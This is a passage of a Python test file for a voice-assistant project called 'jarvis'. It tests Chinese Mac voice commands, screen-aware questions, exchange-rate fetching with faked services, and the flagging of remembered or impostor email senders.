        command = lang.parse_system(said, "zh")
        assert command is not None, said
        assert (command.kind, command.arg) == (kind, arg), said
    assert lang.parse_system("把音量调到百分之五十", "zh").extra == {"level": 50}
    assert lang.parse_system("往上滚一点", "zh").extra == {"amount": 4}
    assert lang.parse_system("点击保存", "zh").extra == {"how": "click"}
    assert lang.parse_system("右键点击桌面", "zh").extra == {"how": "right click"}
    # English in Chinese mode is the English command; questions go to Claude.
    assert lang.parse_system("open Safari", "zh").arg == "safari"
    for said in ("明天几点开会", "输入法怎么切换", "音乐是谁唱的", "按时完成了吗", "帮我总结一下"):
        command = lang.parse_system(said, "zh")
        assert command is None or command.kind in ("open", "quit"), said  # an app, or Claude
    assert lang.parse_system("按时完成了吗", "zh") is None
    assert lang.parse_system("新标签页", "en") is None  # English mode: the English parser
    assert lang.spoken_keys_zh("命令加上档加t") == "cmd+shift+t"
    assert lang.spoken_keys_zh("香蕉") is None


async def test_chinese_mac_commands_and_screen_questions_reach_the_hub(
    settings, quiet_speaker, isolated, monkeypatch
):
    from test_hub import make_hub

    from jarvis import lang, system_voice
    from jarvis.screenwatch import ScreenWatcher

    hub = make_hub(settings, quiet_speaker, isolated=isolated)
    hub.prefs.language = "zh"
    ran = []

    async def carry_out(command, **_k):
        ran.append((command.kind, command.arg))
        return "Opening WeChat."

    monkeypatch.setattr(system_voice, "carry_out", carry_out)
    assert await hub._instant_system("r1", "打开微信")
    assert ran == [("open", "WeChat")]
    assert hub.turn["reply"] == lang.translate("Opening WeChat.", "zh") != "Opening WeChat."
    # "这个报错是什么意思" is about the screen: the picture goes with it.
    sent = []

    async def run_query(rid, query, images=None):
        sent.append(images)

    async def capture():
        return "PIXELS"

    hub.emit = lambda *_a, **_k: None
    hub._run_query = run_query
    hub.screen_watch = ScreenWatcher(capture=capture, app_name=lambda: "Xcode")
    hub.prefs.screen_aware = True
    await hub.ask("这个报错是什么意思")
    assert sent[-1] == [{"media_type": "image/jpeg", "data": "PIXELS"}]
    await hub.ask("明天几点开会")
    assert not sent[-1]


# ── 6. a purchase in another currency is weighed with real rates ──


class FxServer:
    """The two rate services, faked with httpx's MockTransport: what each answers, and
    every request made."""

    def __init__(self, ecb=None, er=None):
        import json

        import httpx

        self.ecb, self.er, self.requests = ecb, er, []

        def handle(request):
            self.requests.append(str(request.url))
            host = request.url.host
            answer = self.ecb if host == "api.frankfurter.dev" else self.er
            if answer is None:
                raise httpx.ConnectError("offline", request=request)
            if isinstance(answer, int):
                return httpx.Response(answer)
            # As a server could send it: Infinity and NaN included, which json.loads reads.
            return httpx.Response(200, content=json.dumps(answer, allow_nan=True).encode())

        self.transport = httpx.MockTransport(handle)


def usd_tables(ecb_eur=0.90, er_eur=0.92):
    ecb = {
        "amount": 1.0,
        "base": "USD",
        "date": "2026-09-28",
        "rates": {"EUR": ecb_eur, "JPY": 150.0},
    }
    er = {
        "result": "success",
        "base_code": "USD",
        "rates": {"EUR": er_eur, "AED": 3.6725, "JPY": 149.5},
    }
    return ecb, er


async def test_rates_come_from_both_services_and_the_careful_one_counts(tmp_path):
    from jarvis.fxrates import Rates

    ecb, er = usd_tables()
    server = FxServer(ecb, er)
    rates = Rates(tmp_path / "fx_rates.json", transport=server.transport)
    assert await rates.convert(90, "USD", "usd") == 90  # the same currency: nothing asked
    assert server.requests == []
    # 90 EUR is 100 USD by the ECB and 97.83 by the other: the larger counts toward limits.
    assert await rates.convert(90, "EUR", "USD") == 100.0
    assert "base=USD" in server.requests[0] and server.requests[1].endswith("/v6/latest/USD")
    assert round(await rates.convert(36.725, "aed", "USD"), 2) == 10.0  # one service knows it
    assert await rates.convert(10, "XYZ", "USD") is None  # no one does
    assert len(server.requests) == 2  # one look for all of them, kept


async def test_rates_are_kept_six_hours_on_disk_and_then_asked_again(tmp_path):
    from jarvis.fxrates import FRESH_SECONDS, Rates

    now = [1_000_000.0]
    server = FxServer(*usd_tables())
    path = tmp_path / "fx_rates.json"
    first = Rates(path, transport=server.transport, clock=lambda: now[0])
    assert await first.convert(90, "EUR", "USD") == 100.0
    assert path.exists() and len(server.requests) == 2
    later = Rates(path, transport=server.transport, clock=lambda: now[0] + 3600)
    assert await later.convert(90, "EUR", "USD") == 100.0  # from the file, a restart later
    assert len(server.requests) == 2
    now[0] += FRESH_SECONDS + 1
    server.ecb, server.er = usd_tables(ecb_eur=0.95, er_eur=0.95)
    assert round(await first.convert(95, "EUR", "USD"), 2) == 100.0
    assert len(server.requests) == 4  # stale: asked again


async def test_without_rates_a_foreign_purchase_is_refused_as_before(tmp_path):
    import pytest

    from jarvis.fxrates import RETRY_SECONDS, Rates
    from jarvis.transactions import Refused, Transactions

    now = [0.0]
    server = FxServer()  # offline
    rates = Rates(tmp_path / "fx.json", transport=server.transport, clock=lambda: now[0])
    assert await rates.convert(90, "EUR", "USD") is None
    assert await rates.convert(50, "EUR", "USD") is None
    assert len(server.requests) == 2  # a failed look isn't repeated at once
    now[0] += RETRY_SECONDS + 1
    server.ecb, server.er = usd_tables()
    assert await rates.convert(90, "EUR", "USD") == 100.0

    async def no_page():
        return {}

    async def never(*_a):
        return False

    offline = Rates(None, transport=FxServer().transport)
    desk = Transactions(no_page, never, lambda: None, convert=offline.convert)
    with pytest.raises(Refused, match="no exchange rate"):
        await desk._home_amount(90.0, "EUR", "USD", "")
    desk = Transactions(no_page, never, lambda: None, convert=rates.convert)
    assert await desk._home_amount(90.0, "EUR", "USD", "") == 100.0
    # A hub that doesn't poll (these tests) never asks the network.
    silent = Rates(None, enabled=False, transport=FxServer(*usd_tables()).transport)
    assert await silent.convert(90, "EUR", "USD") is None


async def test_odd_answers_and_a_damaged_file_never_make_a_rate(tmp_path):
    from jarvis.fxrates import Rates

    bad_rates = {"EUR": -1, "JPY": float("inf"), "GBP": "0.8", "CHF": True, "cad": 1.35}
    ecb = {"base": "EUR", "rates": {"EUR": 0.1}}  # rates for another currency than asked
    er = {"result": "success", "base_code": "USD", "rates": bad_rates}
    server = FxServer(ecb, er)
    path = tmp_path / "fx_rates.json"
    path.write_text("{not json")
    rates = Rates(path, transport=server.transport)
    assert await rates.convert(10, "EUR", "USD") is None
    assert await rates.convert(10, "GBP", "USD") is None
    assert round(await rates.convert(13.5, "CAD", "USD"), 2) == 10.0  # the one good rate
    errors = FxServer({"error": "x"}, {"result": "error", "error-type": "unsupported-code"})
    assert await Rates(None, transport=errors.transport).convert(1, "EUR", "USD") is None
    down = FxServer(503, 500)
    assert await Rates(None, transport=down.transport).convert(1, "EUR", "USD") is None


def test_the_hub_gives_the_purchase_guard_its_rates(settings, quiet_speaker, isolated):
    from jarvis.hub import Hub

    own = {k: v for k, v in isolated.items() if k != "transaction_desk"}
    hub = Hub(settings, client_factory=lambda **k: None, speaker=quiet_speaker, poll=False, **own)
    assert hub.transactions._convert == hub.fx.convert
    assert hub.fx.path == hub.feature_path("fx_rates.json")
    assert hub.fx.enabled is False  # poll off: never the network


# ── 7. someone you told JARVIS about counts like a contact ──


def test_people_in_memory_are_matched_by_address_number_or_full_name():
    from jarvis.interrupts import Remembered

    facts = Remembered.of(
        [
            "Ann Lee is the user's co-founder.",
            "Dad's number is (415) 555-0142; his email is dad@family.example",
            "王小明是我的合伙人",
            "I support Arsenal on weekends; Ed likes Li's cooking.",
        ]
    )
    assert facts.match("Ann Lee", "")
    assert facts.match("Dr. Ann Lee", "")
    assert facts.match("", "+1 415 555 0142") and facts.match("", "DAD@family.example")
    assert facts.match("王小明", "")
    # Whole words only, names of two letters don't count, and neither does a word the
    # facts only use as a word ("support").
    for name in ("Annabel Leeds", "Li Ed", "Support", "Ann Leeds", "李娜", "王", ""):
        assert not facts.match(name, ""), name
    assert not Remembered().match("Ann Lee", "ann@x.example")


def test_a_remembered_sender_gets_a_contacts_point_never_a_vips():
    from test_interrupts import NOW

    from jarvis.interrupts import Item, Remembered, VipList, assess

    def mail(display, address, subject="Lunch next week?"):
        return Item("mail", 1, address, display, subject, NOW, display=display)

    facts = Remembered.of(["Priya Raman is my co-founder", "Ann Lee runs the fund"])
    priya = mail("Priya Raman", "priya@newco.example")
    assert assess(priya, [], None, facts) and priya.remembered
    assert priya.score == 1 and "someone you told me about" in priya.reasons
    stranger = mail("Joe Bloggs", "joe@spam.example")
    assert assess(stranger, [], None, facts) and stranger.score == 0
    # A known contact is one point, not two; a VIP stays a VIP.
    known = Item("mail", 2, "priya@newco.example", "Priya", "Hi", NOW, contact="Priya Raman")
    assert assess(known, [], None, facts) and known.score == 1 and not known.remembered
    # A display name borrowing a contact's name from another address is an impostor,
    # and memory doesn't vouch for it.
    contacts = VipList.of(["Ann Lee", "ann@zainar.com"])
    fake = mail("Ann Lee", "ann.lee@evil.example", "URGENT: wire the funds")
    assert assess(fake, [], contacts, facts) and fake.impostor and not fake.remembered


async def test_the_interrupter_hears_what_memory_holds(tmp_path):
    from test_interrupts import Env

    env = Env(tmp_path)
    facts = ["Priya Raman is my co-founder"]
    watch = await env.started(remembered=lambda: facts)
    env.mail.receive("priya@newco.example", "Priya Raman", "Board deck for Thursday")
    await watch.poll()
    [waiting] = await watch.digest()
    assert waiting.remembered and "someone you told me about" in waiting.reasons


def test_the_hub_gives_the_interrupter_memorys_facts_and_the_watcher_no_mail(
    settings, quiet_speaker, isolated
):
    import inspect

    from jarvis import proactive
    from jarvis.hub import Hub
    from jarvis.memory import MemoryStore

    own = {k: v for k, v in isolated.items() if k != "interrupter"}
    hub = Hub(settings, client_factory=lambda **k: None, speaker=quiet_speaker, poll=False, **own)
    assert isinstance(hub.memory, MemoryStore)
    hub.memory.add("Priya Raman is my co-founder")
    assert hub.interrupts._remembered().match("Priya Raman", "")
    params = inspect.signature(proactive.Watcher).parameters
    assert "mail" not in params and "vip_text" not in params
    assert not hasattr(proactive, "urgent_mail")
